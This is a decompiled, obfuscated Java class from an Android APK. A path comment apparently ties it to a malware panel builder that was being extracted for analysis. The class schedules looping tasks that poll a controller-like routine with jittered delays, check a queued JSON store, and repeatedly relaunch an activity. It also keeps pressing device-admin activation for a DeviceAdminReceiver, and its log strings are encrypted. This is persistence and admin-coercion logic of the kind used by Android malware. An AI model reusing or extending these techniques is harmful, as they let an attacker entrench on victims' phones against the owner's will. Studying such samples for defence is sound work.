package v.s;

import android.content.ComponentName;
import android.content.Intent;
import android.os.PowerManager;
import app.mobilex.plus.UtilGLWorker;
import app.mobilex.plus.receivers.DeviceAdminReceiver;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import org.json.JSONArray;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class X5Jjihf3X5UVoB0 implements Runnable {
    public final /* synthetic */ SyncQYAdapter vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ X5Jjihf3X5UVoB0(SyncQYAdapter syncQYAdapter, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = syncQYAdapter;
    }

    @Override // java.lang.Runnable
    public final void run() {
        JSONArray jSONArray;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = null;
        int i = 3;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                SyncQYAdapter syncQYAdapter = this.vekpFI4d1Nc4fakF;
                y6jRGLEWNMir.b1EoSIRjJHO5(syncQYAdapter.w9sT1Swbhx3hs, null, new JnC75xOgwtSSKHn30v(syncQYAdapter, b9xroaxfr1fmoo2q, 2), 3);
                syncQYAdapter.dDIMxZXP1V8HdM.postDelayed(this, 30000L);
                break;
            case 1:
                if (this.vekpFI4d1Nc4fakF.DVTNwpDEVsUKuznof) {
                    if (!this.vekpFI4d1Nc4fakF.Qrz92kRPw4GcghAc) {
                        this.vekpFI4d1Nc4fakF.ibVTtJUNfrGYbW();
                        this.vekpFI4d1Nc4fakF.nQilHWaqS401ZtR++;
                        this.vekpFI4d1Nc4fakF.Qrz92kRPw4GcghAc = true;
                        SyncQYAdapter syncQYAdapter2 = this.vekpFI4d1Nc4fakF;
                        y6jRGLEWNMir.b1EoSIRjJHO5(syncQYAdapter2.w9sT1Swbhx3hs, null, new JnC75xOgwtSSKHn30v(syncQYAdapter2, b9xroaxfr1fmoo2q, i), 3);
                        try {
                            WMx7O1yIuvMieNw wMx7O1yIuvMieNw = WMx7O1yIuvMieNw.dDIMxZXP1V8HdM;
                            try {
                                jSONArray = new JSONArray(this.vekpFI4d1Nc4fakF.getApplicationContext().getSharedPreferences(WMx7O1yIuvMieNw.w9sT1Swbhx3hs, 0).getString(WMx7O1yIuvMieNw.vekpFI4d1Nc4fakF, "[]"));
                            } catch (Exception unused) {
                                jSONArray = new JSONArray();
                            }
                            if (jSONArray.length() > 0) {
                                String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                                TypefaceCache.obtain("000B0073005A009500E400BD00D700A60037002C001B008100FC00AA00C100AF002A0078005C00C700C3009200E100E700320063005E009200F500FF009A");
                                TypefaceCache.obtain("00630066005E008900F400B600DC00A0006A");
                                WMx7O1yIuvMieNw wMx7O1yIuvMieNw2 = WMx7O1yIuvMieNw.dDIMxZXP1V8HdM;
                                WMx7O1yIuvMieNw.JXn4Qf7zpnLjP5(this.vekpFI4d1Nc4fakF.getApplicationContext());
                            }
                        } catch (Exception e) {
                            String str2 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                            TypefaceCache.obtain("000B0073005A009500E400BD00D700A600370036006800AA00C300FF00D400AB00360065005300C700F500AD00C000A80031002C001B");
                            e.getMessage();
                        }
                        this.vekpFI4d1Nc4fakF.dDIMxZXP1V8HdM.postDelayed(this, (this.vekpFI4d1Nc4fakF.nQilHWaqS401ZtR <= 5 ? 10000L : ((PowerManager) this.vekpFI4d1Nc4fakF.getSystemService("power")).isInteractive() ? 45000L : 60000L) + this.vekpFI4d1Nc4fakF.gmNWMfvn6zlEj + (this.vekpFI4d1Nc4fakF.nQilHWaqS401ZtR <= 5 ? lMJPWn8FzeWU82pNUhWl.w9sT1Swbhx3hs.Ee8d2j4S9Vm5yGuR(2000L) : lMJPWn8FzeWU82pNUhWl.w9sT1Swbhx3hs.Ee8d2j4S9Vm5yGuR(8000L)));
                    } else {
                        String str3 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                        TypefaceCache.obtain("000B0073005A009500E400BD00D700A6003700360048008C00F900AF00C200A20027002C001B009700E200BA00C400AE002C0063004800C700E300AB00DB00AB002F00360052008900B000AF00C000A800240064005E009400E3");
                        this.vekpFI4d1Nc4fakF.dDIMxZXP1V8HdM.postDelayed(this, 5000L);
                    }
                    break;
                }
                break;
            case 2:
                try {
                    String str4 = UtilGLWorker.gIIiyi2ddlMDR0;
                    if (!UtilGLWorker.MLSIo1htfMPWeB8V876L || UtilGLWorker.XiR1pIn5878vVWd) {
                        this.vekpFI4d1Nc4fakF.l1V0lQr6TbwNKqHfXNbb = 0;
                    } else {
                        this.vekpFI4d1Nc4fakF.l1V0lQr6TbwNKqHfXNbb++;
                        if (this.vekpFI4d1Nc4fakF.l1V0lQr6TbwNKqHfXNbb <= 5) {
                            try {
                                Intent intent = new Intent(this.vekpFI4d1Nc4fakF, (Class<?>) UtilGLWorker.class);
                                intent.putExtra(UtilGLWorker.wotphlvK9sPbXJ, true);
                                intent.addFlags(805371904);
                                this.vekpFI4d1Nc4fakF.startActivity(intent);
                            } catch (Exception e2) {
                                String str5 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                                TypefaceCache.obtain("000F00790058008C00B000B200DD00A9002A00620054009500B000BD00C000AE002D0071001B008200E200AD00DD00B500790036");
                                e2.getMessage();
                            }
                        }
                    }
                } catch (Exception e3) {
                    String str6 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                    TypefaceCache.obtain("000F00790058008C00B000B200DD00A9002A00620054009500B000BA00C000B5002C0064000100C7");
                    e3.getMessage();
                }
                this.vekpFI4d1Nc4fakF.dDIMxZXP1V8HdM.postDelayed(this, 5000L);
                break;
            default:
                if (this.vekpFI4d1Nc4fakF.b1EoSIRjJHO5) {
                    try {
                        gA5gCwTK0qjTIn.gIIiyi2ddlMDR0(this.vekpFI4d1Nc4fakF, new ComponentName(this.vekpFI4d1Nc4fakF, (Class<?>) DeviceAdminReceiver.class));
                        break;
                    } catch (Exception unused2) {
                    }
                    this.vekpFI4d1Nc4fakF.dDIMxZXP1V8HdM.postDelayed(this, 2000L);
                }
                break;
        }
    }
}
